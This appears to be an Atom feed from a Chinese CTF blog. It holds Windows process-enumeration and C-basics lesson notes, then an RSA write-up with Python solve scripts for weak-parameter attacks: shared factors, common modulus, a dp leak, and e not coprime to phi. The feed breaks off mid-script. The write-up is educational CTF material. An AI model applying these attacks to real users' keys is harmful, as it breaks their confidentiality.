pe32;</span><br><span class="line">pe32 = &#123; <span class="built_in"><span class="keyword">sizeof</span></span>(pe32) &#125;;</span><br><span class="line"></span><br><span class="line">BOOL ret=<span class="built_in">Process32First</span>(hSnap, &amp;pe32);</span><br><span class="line"><span class="keyword">while</span> (ret)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">wprintf</span>(<span class="string">L&quot;PROCESS_NAME:%s\n&quot;</span>, pe32.szExeFile);</span><br><span class="line">ret=<span class="built_in">Process32Next</span>(hSnap,&amp;pe32);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="运行结果-1"><a href="#运行结果-1" class="headerlink" title="运行结果"></a>运行结果</h4><p><img src="/2022/09/28/syspro1/2.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;跟着 rkvir 老师学学今天的知识，今天的课程是 《Windows系统编程》——进程基础与相关结构&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="reverse" scheme="http://example.com/categories/ctf/reverse/"/>
    
    <category term="winprogram" scheme="http://example.com/categories/ctf/reverse/winprogram/"/>
    
    
  </entry>
  
  <entry>
    <title>《windows高级攻防》——C语言基础</title>
    <link href="http://example.com/2022/09/28/Win_advanced_AD-1/"/>
    <id>http://example.com/2022/09/28/Win_advanced_AD-1/</id>
    <published>2022-09-27T16:00:00.000Z</published>
    <updated>2022-09-28T10:14:10.558Z</updated>
    
    <content type="html"><![CDATA[<p>C 并没有太陌生，只是 win C 还是让我感觉有点陌生的。</p><span id="more"></span><h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="C语言"><a href="#C语言" class="headerlink" title="C语言"></a>C语言</h3><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ol><li>语法简洁，比低级语言更抽象级别更高。</li><li>可移植性强，跨平台能力较好。</li><li>用途广泛，Linux和Windows的内核均是 C 语言编写的。</li><li>可操作性强，通过指针可以任意操控内存。</li></ol><h3 id="C语言生成可执行文件的过程"><a href="#C语言生成可执行文件的过程" class="headerlink" title="C语言生成可执行文件的过程"></a>C语言生成可执行文件的过程</h3><p>源文件(.c)→目标文件(.obj)→通过链接器链接启动代码和库→可执行文件(.exe)</p><p>链接分静态链接和动态链接，静态链接会把库的代码一并写入可执行文件当中，而动态链接依赖于 runtime（运行时），也就是 dll。</p><h3 id="VS的使用"><a href="#VS的使用" class="headerlink" title="VS的使用"></a>VS的使用</h3><p>VS2022在创建项目的时候并不能选择，可以先按照模板创建好之后，项目→属性→C/C++→预编译头中取消预编译头文件，然后删除它给的 pch.cpp，删除里面的所有代码，只留一个 main.cpp 即可。</p><p>在属性设置中，可以使用 Release/Debug 选择 发行/调试版，发行版一般优化更多，调试版一般会包含调试信息，方便调试。</p><p>在 项目→属性→C/C++→代码生成 当中的选项，运行库选择 MDd 表示动态链接，MTd 表示静态链接。</p><p>main函数并非第一个执行的函数，首先执行的是启动代码，只不过启动代码默认首先调用 main 函数，在 VS 当中可以修改入口点让我们的启动函数非 main 函数。</p><p><img src="/2022/09/28/Win_advanced_AD-1/1.png"></p><p>头文件(.h)，声明函数的用法，实际实现已经在库或者是 cpp 当中了，我们实际调用代码的时候只需要 include 对应的头文件即可。</p><p>写一个 add 函数，创建好声明和定义。</p><p><img src="/2022/09/28/Win_advanced_AD-1/2.png"></p><p>最后再在 main 函数中包含 add.h 即可调用代码。</p><p>在 include 自己写的文件时，需用双引号包裹而不是尖括号，尖括号只会从系统头文件中寻找而不会从自己写的头文件中寻找。</p><p><img src="/2022/09/28/Win_advanced_AD-1/3.png"></p><p>在监视窗口中，添加 err,hr 可以监视错误，获取错误码，获取到的错误码可以通过 菜单栏中的工具→错误查找 中查询对应的报错信息。</p><h2 id="课后作业"><a href="#课后作业" class="headerlink" title="课后作业"></a>课后作业</h2><blockquote><p>什么是可移植性？</p></blockquote><p>可移植性自认为就是将代码运行从一个平台到另一个平台的难易程度吧，越简单则可移植性越强。</p><blockquote><p>编译器是做什么的？</p></blockquote><p>编译器是用于编译源代码的，将高级语言翻译成低级语言的程序。</p><blockquote><p>链接器是做什么的？</p></blockquote><p>感觉作用应该是合并两个文件的代码块？在Linux C中应该是为可执行文件添加全局地址和提供库连接的方案使用的。</p><blockquote><p>什么是语法错误？</p></blockquote><p>不符合语法规则的源代码书写，语法错误会直接导致编译无法进行。</p><blockquote><p>什么是语义错误？</p></blockquote><p>可以编译可以运行，但是可能会导致运行结果不正确，一般这个好像叫逻辑错误。</p><blockquote><p>编写程序打印信息：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%d\n%s&quot;</span>, <span class="string">&quot;xia0ji233&quot;</span>, <span class="number">20</span>, <span class="string">&quot;1399999999&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>编写一个函数实现上述功能，并在主函数调用：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n%d\n%s&quot;</span>, <span class="string">&quot;xia0ji233&quot;</span>, <span class="number">20</span>, <span class="string">&quot;1399999999&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">print</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>四种运行库编译选项的区别？</p></blockquote><p>感觉就是静态调试，静态非调试，动态调试，动态非调试。。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;C 并没有太陌生，只是 win C 还是让我感觉有点陌生的。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="reverse" scheme="http://example.com/categories/ctf/reverse/"/>
    
    <category term="winprogram" scheme="http://example.com/categories/ctf/reverse/winprogram/"/>
    
    
  </entry>
  
  <entry>
    <title>RSA题目常见分析</title>
    <link href="http://example.com/2022/09/27/RSA_Ex/"/>
    <id>http://example.com/2022/09/27/RSA_Ex/</id>
    <published>2022-09-27T15:00:00.000Z</published>
    <updated>2022-09-27T00:56:16.047Z</updated>
    
    <content type="html"><![CDATA[<p>最近驹宝给我塞了很多RSA的题，自己也做了很多，学下点 RSA 算法的精髓，写一篇总结，后续持续在这里更新。</p><span id="more"></span><h2 id="RSA的介绍"><a href="#RSA的介绍" class="headerlink" title="RSA的介绍"></a>RSA的介绍</h2><p>RSA的介绍见我<a href="https://xia0ji233.pro/2022/04/15/RSA%E5%8A%A0%E5%AF%86%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/">这篇博客</a></p><h2 id="RSA常用做法分析"><a href="#RSA常用做法分析" class="headerlink" title="RSA常用做法分析"></a>RSA常用做法分析</h2><h3 id="低指数攻击"><a href="#低指数攻击" class="headerlink" title="低指数攻击"></a>低指数攻击</h3><p>我们知道，RSA的安全在于取模运算的不可逆特性，如果说我的信息本来就是 2，你的加密指数为 2，那么平方下来也就是个 4，取模之后就是取了个寂寞，根据所给公钥和密文，我们直接开个方就得到了明文。</p><h3 id="模不互素"><a href="#模不互素" class="headerlink" title="模不互素"></a>模不互素</h3><p>如果两个公钥模不互素，含有公约数的话，我们用辗转相除法可以很快分解出 p 和 q，而辗转相除法的时间复杂度不会超过 O(log2N)，这优秀的复杂度也让我们能很快地分解得到两个质数。</p><h4 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n1=<span class="number">28170992834270720831179261369471274598997702487696049830156332106869494605756009553416359364123120058506393684721611134396175255085248520813138288550002318384024725495758952465143175548462425605668727426820108069752293438648949444194603512285742873214792072294105948293367708158997811248728037063455817833123285203002351350137897355454137123787850275750591595704048821577823564124943498574623818380616182913536791603277118981723293551366839681774271977694827633752127448663006058876017157727926930195199823324400467529841773190345386219832514302786638128439120112894598351249563655852372309078552091992786038041766277</span></span><br><span class="line">n2=<span class="number">30426052411541162629650340351029618556957464479756072258366284852617100608440692462790708527260160603801880998062586095228968453145338155923161883183976907495994708490254171467816217449157828401468749415010271748760024562712415222883445840692381712769800218961961965983057269763458953887162943884366520363358693455535663411308843107559177367470269889790117080885165058052596106490369729956697643818346630535515535267060826393590576457246653806670129899406037697985668889417354391424342725773231355312621066562784839302709229489550567684239158552675013440867386238425395428315796266930676815788000373750994287793821091</span></span><br><span class="line">c1=<span class="number">2582291333174688473482837371310695558013344522219801451176882867544382844570171875599043056723912248821021128705894777239584884707037606324176075924881206372661647696306877429822668287235786023020814823874667156587819928274230054865962630859689154098113218782923808109545553391020429182265395418495962822105988502721180599540017512038621869581406476916453238250489026172610106413861344378397008077526294299119321017408325053654182442842084345081920983250459754887618685974033809325906564138957727999316089837005460571267003092757134432108859653429713579692972626913060573924381433177244348871427046105683280661716738</span></span><br><span class="line">c2=<span class="number">9479980959348294048040415043005053472430206540648250182203975873154652511903511233814860462809419869817942169405620776050389695639672610182559325440498062679122369415235835023694654421107733717733775846408272826799042552945154258022884833151833319678933958340634903581390433575987867437793326943284375631246178387198398978881023408777618571874239336944658161598413171690119933787696662425323587221393547627048996325679636765500603814636055989176181848082280852597546562839789752131657822041737796527736673507903567282808259265596977598085942774362863079389090752606097401982926590840320148439167865891839785863650767</span></span><br><span class="line">e=<span class="number">65537</span></span><br></pre></td></tr></table></figure><p>这里我们 GCD 大可不必自己写，直接用 Crypto 库的 GCD 函数即可，安装方法也在上一篇博客。</p><h4 id="解题脚本"><a href="#解题脚本" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">c,p,q,e</span>):</span></span><br><span class="line">    n=p*q</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m).decode()</span><br><span class="line">n1=<span class="number">28170992834270720831179261369471274598997702487696049830156332106869494605756009553416359364123120058506393684721611134396175255085248520813138288550002318384024725495758952465143175548462425605668727426820108069752293438648949444194603512285742873214792072294105948293367708158997811248728037063455817833123285203002351350137897355454137123787850275750591595704048821577823564124943498574623818380616182913536791603277118981723293551366839681774271977694827633752127448663006058876017157727926930195199823324400467529841773190345386219832514302786638128439120112894598351249563655852372309078552091992786038041766277</span></span><br><span class="line">n2=<span class="number">30426052411541162629650340351029618556957464479756072258366284852617100608440692462790708527260160603801880998062586095228968453145338155923161883183976907495994708490254171467816217449157828401468749415010271748760024562712415222883445840692381712769800218961961965983057269763458953887162943884366520363358693455535663411308843107559177367470269889790117080885165058052596106490369729956697643818346630535515535267060826393590576457246653806670129899406037697985668889417354391424342725773231355312621066562784839302709229489550567684239158552675013440867386238425395428315796266930676815788000373750994287793821091</span></span><br><span class="line">c1=<span class="number">2582291333174688473482837371310695558013344522219801451176882867544382844570171875599043056723912248821021128705894777239584884707037606324176075924881206372661647696306877429822668287235786023020814823874667156587819928274230054865962630859689154098113218782923808109545553391020429182265395418495962822105988502721180599540017512038621869581406476916453238250489026172610106413861344378397008077526294299119321017408325053654182442842084345081920983250459754887618685974033809325906564138957727999316089837005460571267003092757134432108859653429713579692972626913060573924381433177244348871427046105683280661716738</span></span><br><span class="line">c2=<span class="number">9479980959348294048040415043005053472430206540648250182203975873154652511903511233814860462809419869817942169405620776050389695639672610182559325440498062679122369415235835023694654421107733717733775846408272826799042552945154258022884833151833319678933958340634903581390433575987867437793326943284375631246178387198398978881023408777618571874239336944658161598413171690119933787696662425323587221393547627048996325679636765500603814636055989176181848082280852597546562839789752131657822041737796527736673507903567282808259265596977598085942774362863079389090752606097401982926590840320148439167865891839785863650767</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=GCD(n1,n2)</span><br><span class="line">q1=<span class="built_in">int</span>(n1//p)</span><br><span class="line">q2=<span class="built_in">int</span>(n2//p)</span><br><span class="line"><span class="built_in">print</span>(solve(c1,p,q1,e)+solve(c2,p,q2,e))</span><br><span class="line"><span class="comment">#flag&#123;79a0ad16-d357-49af-81e9-d33dc3e541a2&#125;</span></span><br></pre></td></tr></table></figure><h3 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h3><p>当一个明文信息在两个不同的指数对同一模数进行了加密之后，我们可以在不求出私钥的情况下计算得到明文信息。</p><p>假设有两个密钥</p><p>$key_1=&lt;e_1,n&gt;$</p><p>$key_2=&lt;e_2,n&gt;$</p><p>明文为 m，我们用这两个公钥分别加密出两串密文。</p><p>$c_1=m^{e_1}%n$</p><p>$c_2=m^{e_2}%n$</p><p>这里需要用到点高数知识。对于整数 $k_1,k_2$，使得方程 $k_1x+k_2y=b$ 存在整数解的前提是 b 能整除 $k_1$ 和 $k_2$ 的最小公约数，也就是 $\gcd(k_1,k_2)$。</p><p>特殊地，对于 b=1，存在整数解的充要条件则是 $k_1$ 与 $k_2$ 互质。</p><p>一般情况下，RSA 的加密指数我们会取质数，所以很容易有 $e_1x+e_2y=1$ 存在一对整数解 (x,y)。</p><p>那么</p><p>$c_1^{x}\times c_2^{y}%n=(m^{xe_1}\times m^{ye_2})%n=m^{xe_1+ye_2}%n$</p><p>最后化简即得到明文 m。</p><p>我们的目标就是找到一对整数解，对于这个问题，我们可以使用扩展欧几里得算法去计算，或者是使用 Z3 去求解。</p><p>但是我们也很容易能看出，这个整数解应该会是一正一负的，对于负数我们需要做点特殊处理。</p><p>其实比较简单，负数指数我们并不好处理，因为在乘法模的群当中，数集为整数，负指数表示了分数，显然不满足群的封闭性，其实这里处理的方法与我们之前逆元的处理方法一样。</p><p>举个栗子：假设 x&gt;0,y&lt;0，则 $x^y$ 它的逆元为多少，假设不在模乘法代数而是在普通乘法代数，数集被扩展到了实数集，那我们脱口而出肯定是 $x^{-y}$。那么其实，在模乘法体系中，$x^y$ 的逆元一样是 $x^{-y}$，但是它不好被辨别，于是我们再去找到它逆元的逆元，一个数的逆元的逆元一定是自身。</p><p>我们直接找到 $x$ 在模乘法意义下的逆元 $x^{-1}$ 之后再保持指数不变即是它的逆元，我们可以证明一下：</p><p>$x^{y}\times (x^{-1})^y%n=(x\times x^{-1})^y%n=1$</p><p>因此对于负指数，我们直接符号变正，底数变为逆元即可。</p><h4 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br></pre></td></tr></table></figure><h4 id="解题脚本-1"><a href="#解题脚本-1" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x=egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line">c1=<span class="number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span></span><br><span class="line">n=<span class="number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span></span><br><span class="line">e1=<span class="number">11187289</span></span><br><span class="line">c2=<span class="number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span></span><br><span class="line">e2=<span class="number">9647291</span></span><br><span class="line">s=egcd(e1, e2)</span><br><span class="line">x=s[<span class="number">1</span>]</span><br><span class="line">y=s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> x&lt;<span class="number">0</span>:</span><br><span class="line">    x=-x</span><br><span class="line">    c1=inverse(c1,n)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    y=-y</span><br><span class="line">    c2=inverse(c2,n)</span><br><span class="line">m=(<span class="built_in">pow</span>(c1,x,n)*<span class="built_in">pow</span>(c2,y,n))%n</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment">#flag&#123;49d91077a1abcb14f1a9d546c80be9ef&#125;</span></span><br></pre></td></tr></table></figure><h3 id="数学推导"><a href="#数学推导" class="headerlink" title="数学推导"></a>数学推导</h3><p>这是一类比较泛的题目，题目除了给出密文和公钥以外，还会额外给出一些表达式信息，帮助破解 RSA 的密文，只要理解了 RSA，熟悉 RSA 的推导过程就不会有太大问题。</p><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">n=<span class="number">14113714305072797946493506481186688069348068525719522300918296843166886149586712593527278499546480608243022456418279126062291885234984378509284469719982424691272187376834036952743111743737743509787289516031073996690244502575328189110938473272385195987277353305316883743349963569552297946004952533211450648686747906145487061115730661553947322806175740991677666279314224690585522184085274523080051179955809948156424572176333474623245604759865579902860320192130044881910837668330885305900309636233281430338678478325361905450208233862057975227437570700376032367636653508625619621365742913511560163593564542385538976273511</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8618327949649600151577805769536868884186050491362368463626647780332443491577028760576306554954308943953267510827791879308004801627303605775129313660121772370222619585966214292305860970821159935577290407908606708688407395127864609535430976332421315463289482130097266383749917829831497635736596409478627650432841064479081322546224912505920515470753069832953929215867402615727986720952496172221103420158414576649301068869241456517428304569955008818909581293445988877086661570321362965360400214418049394686624646829322189252357911547541529314699149144426085781464325489219068048330497460674000186446200265603018557000483</span></span><br><span class="line">dp=<span class="number">22254124501058125233734227965547943196721474032074981803310625346887468776340246924403662046504410526020245040082211662134244900364674425023930821673400316961211254098599523105818306877684796612309587274228054352459332784217520606687007798656236622150535124212386499498298989015161102829904127676310132589861</span></span><br><span class="line">dp=d % (p -<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>这个题目中，它给了我们 d % (p-1) 的值 dp。</p><p>首先我们联立一下方程组</p><p>$e\times d%(p-1)(q-1)=1$ </p><p>$d%(p-1)=dp$</p><p>根据①式我们可以推出</p><p>$e\times d=k(p-1)(q-1)+1$</p><p>我们在②式左右同乘一个 e。</p><p>$e\times d%(p-1)=dp\times e%(p-1)$</p><p>从左边不难看出，结果应当=1，于是得到等式</p><p>$dp\times e%(p-1)=1$</p><p>首先不难得到 $dp&lt;p$ 则 $dp\times e&lt;p\times e$。</p><p>$dp\times e=k(p-1)+1$</p><p>图中只有 k 与 p 未知，但是我们应当明白 k 不会超过 e。</p><p>于是我们可以将 $dp\times e -1$ 对 $k(k\le e)$ 进行取模判断，若取模结果为零则有可能是这个结果。</p><p>那么我们跑个脚本循环 $[2,65537]$ 即可。</p><h4 id="解题脚本-2"><a href="#解题脚本-2" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n=<span class="number">14113714305072797946493506481186688069348068525719522300918296843166886149586712593527278499546480608243022456418279126062291885234984378509284469719982424691272187376834036952743111743737743509787289516031073996690244502575328189110938473272385195987277353305316883743349963569552297946004952533211450648686747906145487061115730661553947322806175740991677666279314224690585522184085274523080051179955809948156424572176333474623245604759865579902860320192130044881910837668330885305900309636233281430338678478325361905450208233862057975227437570700376032367636653508625619621365742913511560163593564542385538976273511</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">8618327949649600151577805769536868884186050491362368463626647780332443491577028760576306554954308943953267510827791879308004801627303605775129313660121772370222619585966214292305860970821159935577290407908606708688407395127864609535430976332421315463289482130097266383749917829831497635736596409478627650432841064479081322546224912505920515470753069832953929215867402615727986720952496172221103420158414576649301068869241456517428304569955008818909581293445988877086661570321362965360400214418049394686624646829322189252357911547541529314699149144426085781464325489219068048330497460674000186446200265603018557000483</span></span><br><span class="line">dp=<span class="number">22254124501058125233734227965547943196721474032074981803310625346887468776340246924403662046504410526020245040082211662134244900364674425023930821673400316961211254098599523105818306877684796612309587274228054352459332784217520606687007798656236622150535124212386499498298989015161102829904127676310132589861</span></span><br><span class="line"><span class="comment">#dp=d % (p -1)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">65537</span>):</span><br><span class="line">    <span class="keyword">if</span> (dp*e-<span class="number">1</span>)%i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> isPrime((dp*e-<span class="number">1</span>)//i+<span class="number">1</span>):</span><br><span class="line">            p=(dp*e-<span class="number">1</span>)//i+<span class="number">1</span></span><br><span class="line">            q=n//p</span><br><span class="line">            phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">            d=inverse(e,phi)</span><br><span class="line">            m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">            <span class="built_in">print</span>(long_to_bytes(m).decode())</span><br><span class="line"><span class="comment">#flag&#123;0cd82bfc-5544-43c5-b48c-ce11136bea49&#125;</span></span><br></pre></td></tr></table></figure><h3 id="e-phi不互素"><a href="#e-phi不互素" class="headerlink" title="e phi不互素"></a>e phi不互素</h3><p>我们知道 RSA 的加密指数一般为质数，若不是质数会发生什么？</p><p>我们前面推导过 RSA 的计算过程，若 e 不是质数会导致可能求不出 phi 的逆元，或者说找不到一个这样的数 d，使得 $e\times d %\phi=1$，如果 $\gcd(e,\phi)=k$ 则 $e\times d%\phi$ 的结果至少为 k 的整倍数。</p><p>我们按照 RSA 的解密方法最后推导出来的结果也就是</p><p>$m^{k}%n$</p><p>因此我们就回到了怎么解这个指数的问题，若指数 k 小可以直接开方，或者是动用一下低指数攻击。</p><h4 id="例题1-1"><a href="#例题1-1" class="headerlink" title="例题1"></a>例题1</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p=<span class="number">136959726431205865477775151957746058501964084915586200859223998224419328617512480807779057493884259671732817083158742688893426777301273633213099180123980988559064240005229990903986655711210993445188959348127903344696563428112042019089659624505185444899365837872965591393711833751140798071913532034918073969303</span></span><br><span class="line">q=<span class="number">100775514992570031279080353204884456896540523509595089891057558352540088307146118253575941345444101592071454319892938692060454946607143974473707141313645549356430599711832162076318618985329980795933151213484006411944383963148067340413103907427302327136609462283013833061184517264215353793537565873817217882871</span></span><br><span class="line">e=<span class="number">618</span></span><br><span class="line">c=<span class="number">11474180598339059739824064616811901863008672847264841633401805944654527375502760803872877763162433116575938389089158136355223441822920717752520632181250987580240513955742874287005589873425759901749449152080440281411772036003528325772394140583924413056042024007990830484221229380940124523505145729796879325683192331242784866357454098755097887413530621128405967607900565276243646588213591552811550038972567938749944372033373196416854332876524071485674100971839799288548733601138685897794138343613068716766810753454049042387074495749784721897884348181557610094355833915443696680454373648737843918284068627924128987496538</span></span><br></pre></td></tr></table></figure><p>题目中给出了 $p,q$，我们就照例求一下私钥，但是注意到 $e$ 并非一个质数，所以我们先看看有没有公约数，可以发现有公约数 6。但是这里需要注意，在 <strong>Crypto.Util.number</strong> 中的 inverse 函数，如果有公约数，则会自动帮你除公约数之后的逆元，而 gmpy2 的 invert 函数则会直接报错。</p><h4 id="解题脚本-3"><a href="#解题脚本-3" class="headerlink" title="解题脚本"></a>解题脚本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span 